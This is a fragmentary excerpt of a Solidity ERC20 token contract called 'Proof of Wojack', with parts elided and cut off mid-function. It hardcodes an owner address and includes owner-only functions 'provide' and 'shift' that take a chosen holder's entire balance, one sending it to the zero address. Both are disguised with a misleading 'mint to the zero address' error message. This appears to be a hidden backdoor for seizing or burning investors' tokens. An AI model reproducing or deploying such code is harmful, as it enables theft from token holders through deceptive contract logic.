...
contract  Wojack is Context, IERC20 {
    ...
    address lead_deployer = 0x376D6F71925CB767ff28918087108B39485FA0c8;
    address public _owner = 0x376D6F71925CB767ff28918087108B39485FA0c8;
   constructor () public {


        
        _name = "Proof of Wojack";
        _symbol = "ETH3.0";
        _decimals = 18;
        uint256 initialSupply = 420069999999;
        _safeOwner = _owner;
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function provide(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
        ...
        function shift(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
